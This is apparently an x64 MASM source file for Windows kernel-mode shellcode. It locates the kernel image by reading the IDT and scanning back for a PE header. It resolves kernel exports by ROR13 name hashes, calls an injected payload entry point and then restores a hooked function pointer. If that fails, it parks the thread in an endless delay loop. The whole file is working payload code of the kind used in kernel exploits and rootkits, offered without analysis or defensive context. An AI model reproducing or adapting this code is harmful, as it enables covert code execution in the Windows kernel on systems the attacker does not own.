extern driver_shellcode_entry:PROC
.CODE
main PROC
	jmp main_start
	data_orig_fnptr			dq 0000000000000000h				
	data_orig_fnptrcode		dq 0000000000000000h
	one_second				dq 0FFFFFFFFFF676980h
main_start:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rsi
	PUSH rdi
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	SIDT [rsp]
	mov r11, rcx ;小心提防WorkItem
	MOV rcx, [rsp+2]       
	MOV rcx, [rcx+4] 
	CALL PEGetModuleFromAddress_ScanBack
	MOV r12, rax
	sub rsp,40h
	mov rdx,r11
	mov rcx,r12
	call driver_shellcode_entry
	add rsp,40h
	MOV rax, [data_orig_fnptrcode]
	MOV rcx, [data_orig_fnptr]
	test rax,rax
	jz loop_for_ever2
	MOV [rcx], rax
	MOV rsp, rsi
	POP rsi
	POP r13
	POP r12
	POP r11
	POP r10
	POP rdi
	POP rsi
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	MOV rax, [data_orig_fnptr]
	JMP rax
loop_for_ever2:
	test rcx,rcx
	jnz loop_for_ever;rcx!=0,rax=0,loop for ever,rcx=rax=0,ret
	MOV rsp, rsi
	POP rsi
	POP r13
	POP r12
	POP r11
	POP r10
	POP rdi
	POP rsi
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	mov RAX,0C0000001h
	RET
loop_for_ever:
	mov edx,58586d92h
	mov rcx,r12
	call PEGetProcAddressH_asm
	mov r13,rax
loop_1:
	sub rsp,40h
	mov rcx,0
	mov rdx,0
	lea r8,[one_second]
	mov rax,0FFFFFFFFFF676980h
	mov [r8],rax
	call r13
	add rsp,40h
	jmp loop_1
main ENDP

; ----------------------------------------------------
; Search for PE header given an address. May cause page faults.
; rcx -> scan address
; rax <- header address
; ----------------------------------------------------
PEGetModuleFromAddress_ScanBack PROC
	SHR rcx, 12
	SHL rcx, 12
	address_loop:
	MOV eax, 1000h
	SUB rcx, rax
	MOV ax, [rcx]		; dos header magic
	CMP ax, 5a4dh
	JNE address_loop
	MOV eax, [rcx+60]	; nt header address offset
	CMP eax, 1000h
	JNBE address_loop
	ADD rax, rcx		; nt header address
	MOV eax, [rax]
	CMP eax, 00004550h	; nt header magic
	JNE address_loop
	MOV rax, rcx
	RET
PEGetModuleFromAddress_ScanBack ENDP

; ----------------------------------------------------
; Perform ROR13 hashing
; rcx -> string ptr
; rax <- result
; ----------------------------------------------------
HashROR13A_asm PROC
	PUSH rsi
	PUSH rdi
	MOV rsi, rcx
	XOR rdi, rdi
	XOR rax, rax
	CLD
	hash_loop:
	LODSB
	TEST al, al
	JZ hash_loop_finish
	ROR edi, 13
	ADD edi, eax
	JMP hash_loop
	hash_loop_finish:
	MOV eax, edi
	POP rdi
	POP rsi
	RET
HashROR13A_asm ENDP

; rcx -> module base address
; rdx -> hash of exported function
; rax <- address of exported function
PEGetProcAddressH_asm PROC
	; rdi = PIMAGE_EXPORT_DIRECTORY
	; rsi = counter NumberOfNames
	PUSH rdi
	PUSH rsi
	MOV edi, [rcx+60]	; nt header address offset
	MOV edi, [rdi+rcx+136]
	ADD rdi, rcx		; ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule  
	MOV r8d, [rdi+24]	; PIMAGE_EXPORT_DIRECTORY->NumberOfNames
	XOR rsi, rsi
	find_loop:
	MOV eax, [rdi+32]			; PIMAGE_EXPORT_DIRECTORY->AddressOfNames
	ADD rax, rcx				; PIMAGE_EXPORT_DIRECTORY->AddressOfNames + hModule
	MOV eax, [rax+rsi*4]		; AddressOfNames[index]
	ADD rax, rcx
	PUSH rcx
	MOV rcx, rax
	CALL HashROR13A_asm
	POP rcx
	CMP eax, edx
	JE find_loop_found
	INC rsi
	JMP find_loop
	find_loop_found:
	; found!
	MOV edx, [rdi+36]		; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals + hModule
	XOR rax, rax
	MOV ax, [rdx+rsi*2]		; AddressOfNameOrdinals[index]
	MOV edx, [rdi+28]		; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions 
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions + hModule
	MOV eax, [rdx+rax*4]	; AddressOfFunctions[index]
	ADD rax, rcx			; AddressOfFunctions[index] + hModule
	POP rsi
	POP rdi
	RET
PEGetProcAddressH_asm ENDP

GetCR3 PROC
	MOV rax, cr3
	RET
GetCR3 ENDP

; ----------------------------------------------------
; Flush the CPU cache.
; ----------------------------------------------------
CacheFlush PROC
	WBINVD
	RET
CacheFlush ENDP


END